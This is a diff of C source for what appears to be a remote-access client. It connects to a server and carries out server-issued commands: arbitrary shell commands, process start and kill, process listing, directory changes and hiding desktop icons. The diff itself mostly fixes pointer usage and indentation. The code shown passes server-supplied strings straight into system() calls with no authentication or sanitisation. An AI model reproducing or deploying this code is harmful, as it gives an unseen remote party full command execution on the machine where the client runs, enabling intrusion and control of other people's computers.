@@ -45,8 +45,8 @@ char *readFile(char* filename, int* fileSizeRet)
     FILE *file;
     if (access(filename, F_OK) == -1)
     {
-	if (fileSizeRet != NULL) fileSizeRet = -1;
-	return NULL;
+    if (fileSizeRet != NULL) *fileSizeRet = -1;
+    return NULL;
     }
     file = fopen(filename, "r");
     fseek(file, 0L, SEEK_END);
@@ -302,8 +302,8 @@ client_reconnect:
 	char msg[bytesRead];
 	memcpy(&msg, &recvBuffer, bytesRead); //destination, source, size
 	writeString("Server message: ");
-	writeLine(&msg, bytesRead);
-	if (StartsWith(&msg, "getinfo-"))
+	writeLine(msg, bytesRead);
+	if (StartsWith(msg, "getinfo-"))
 	{
 	    char* clientID = malloc(8);
 	    char* cmdStart = malloc(512);
@@ -337,7 +337,7 @@ client_reconnect:
 	    goto client_create_socket;
 	}
 
-	if (StartsWith(&msg, "msg|"))
+	if (StartsWith(msg, "msg|"))
 	{
 	    char* command = malloc(1024);
 	    memset(command, 0, sizeof(command));
@@ -370,7 +370,7 @@ client_reconnect:
 	    command = NULL;
 	}
 
-	if (StartsWith(&msg, "cd"))
+	if (StartsWith(msg, "cd"))
 	{
 	    char* option = malloc(32);
 	    memset(option, 0, sizeof(option));
@@ -391,33 +391,33 @@ client_reconnect:
 	    option = NULL;
 	}
 
-	if (StartsWith(&msg, "emt|"))
+	if (StartsWith(msg, "emt|"))
 	{
-	    char* element = malloc(32);
-	    char* option = malloc(16);
-	    memset(element, 0 ,sizeof(element));
-	    memset(option, 0, sizeof(option));
-	    int indexOfSecondPipe = firstIndexOf(msg, '|', bytesRead, 1);
-	    int optionLength = indexOfSecondPipe - 4;
-	    int elementLength = bytesRead - indexOfSecondPipe - 1;
-	    Substring(option, &msg[4], indexOfSecondPipe - 4);
-	    Substring(element, &msg[indexOfSecondPipe + 1], bytesRead - indexOfSecondPipe - 1);
-	    if (strncmp(element, "desktop", elementLength) == 0)
-	    {
+		char* element = malloc(32);
+		char* option = malloc(16);
+		memset(element, 0 ,sizeof(element));
+		memset(option, 0, sizeof(option));
+		int indexOfSecondPipe = firstIndexOf(msg, '|', bytesRead, 1);
+		int optionLength = indexOfSecondPipe - 4;
+		int elementLength = bytesRead - indexOfSecondPipe - 1;
+		Substring(option, &msg[4], indexOfSecondPipe - 4);
+		Substring(element, &msg[indexOfSecondPipe + 1], bytesRead - indexOfSecondPipe - 1);
+		if (strncmp(element, "desktop", elementLength) == 0)
+		{
 		if (strncmp(option, "show", optionLength) == 0)
 		{
-		    system("gsettings set org.gnome.desktop.background show-desktop-icons true");
+			system("gsettings set org.gnome.desktop.background show-desktop-icons true");
 		}
 
 		if (strncmp(option, "hide", optionLength) == 0)
 		{
-		    system("gsettings set org.gnome.desktop.background show-desktop-icons false");
+			system("gsettings set org.gnome.desktop.background show-desktop-icons false");
 		}
-	    }
-	    free(element);
-	    element = NULL;
-	    free(option);
-	    option = NULL;
+		}
+		free(element);
+		element = NULL;
+		free(option);
+		option = NULL;
 	}
 
 	if (strncmp(msg, "proclist", bytesRead) == 0)
@@ -431,33 +431,33 @@ client_reconnect:
 	    system("rm proc.txt");
 	}
 
-	if (StartsWith(&msg, "prockill|"))
+	if (StartsWith(msg, "prockill|"))
 	{
-	    char* shellCommand = malloc(128);
-	    char* procID = malloc(16);
-	    memset(procID, 0, sizeof(procID));
-	    memset(shellCommand, 0, sizeof(shellCommand));
-	    Substring(procID, &msg[9], bytesRead - 9);
-	    strcat(shellCommand, "kill ");
-	    strcat(shellCommand, procID);
-	    system(shellCommand);
-	    writeString(shellCommand);
-	    free(shellCommand);
-	    shellCommand = NULL;
-	    free(procID);
-	    procID = NULL;
+		char* shellCommand = malloc(128);
+		char* procID = malloc(16);
+		memset(procID, 0, sizeof(procID));
+		memset(shellCommand, 0, sizeof(shellCommand));
+		Substring(procID, &msg[9], bytesRead - 9);
+		strcat(shellCommand, "kill ");
+		strcat(shellCommand, procID);
+		system(shellCommand);
+		writeString(shellCommand);
+		free(shellCommand);
+		shellCommand = NULL;
+		free(procID);
+		procID = NULL;
 	}
 
-	if (StartsWith(&msg, "procstart|"))
+	if (StartsWith(msg, "procstart|"))
 	{
-	    char* procName = malloc(256);
-	    memset(procName, 0, sizeof(procName));
-	    int indexOfSecondPipe = firstIndexOf(msg, '|', bytesRead, 1);
-	    Substring(procName, &msg[10], indexOfSecondPipe - 10);
-	    strcat(procName, " &");
-	    system(procName);
-	    free(procName);
-	    procName = NULL;
+		char* procName = malloc(256);
+		memset(procName, 0, sizeof(procName));
+		int indexOfSecondPipe = firstIndexOf(msg, '|', bytesRead, 1);
+		Substring(procName, &msg[10], indexOfSecondPipe - 10);
+		strcat(procName, " &");
+		system(procName);
+		free(procName);
+		procName = NULL;
 	}
 
 	if (strncmp(msg, "startcmd", bytesRead) == 0)
@@ -481,32 +481,32 @@ client_reconnect:
 	    else writeString("Shell read thread started");
 	}
 
-	if (StartsWith(&msg, "cmd|"))
+	if (StartsWith(msg, "cmd|"))
 	{
-	    char* output = malloc(1536);
-	    char* realCommand = malloc(512);
-	    memset(output, 0, sizeof(output));
-	    memset(realCommand, 0, sizeof(realCommand));
-	    Substring(realCommand, &msg[4], bytesRead - 4);
+		char* output = malloc(1536);
+		char* realCommand = malloc(512);
+		memset(output, 0, sizeof(output));
+		memset(realCommand, 0, sizeof(realCommand));
+		Substring(realCommand, &msg[4], bytesRead - 4);
 
-	    if (shellFd == -1)
-	    {
+		if (shellFd == -1)
+		{
 		writeString("Invalid File Descriptor!");
 		continue; //Continue to read TCP stream, don't return, but exit this block
-	    }
+		}
 
-	    strcat(output, "echo \"$(");
-	    strcat(output, realCommand);
-	    strcat(output, ")\" > ");
-	    strcat(output, clientHomeDir);
-	    strcat(output, "/cmdout.txt\n\0");
-	    int outLength = strlen(output);
-	    writeDevice(output, &outLength, &shellFd);
+		strcat(output, "echo \"$(");
+		strcat(output, realCommand);
+		strcat(output, ")\" > ");
+		strcat(output, clientHomeDir);
+		strcat(output, "/cmdout.txt\n\0");
+		int outLength = strlen(output);
+		writeDevice(output, &outLength, &shellFd);
 
-	    free(output);
-	    output = NULL;
-	    free(realCommand);
-	    realCommand = NULL;
+		free(output);
+		output = NULL;
+		free(realCommand);
+		realCommand = NULL;
 	}
 
 	if (strncmp(msg, "stopcmd", bytesRead) == 0)
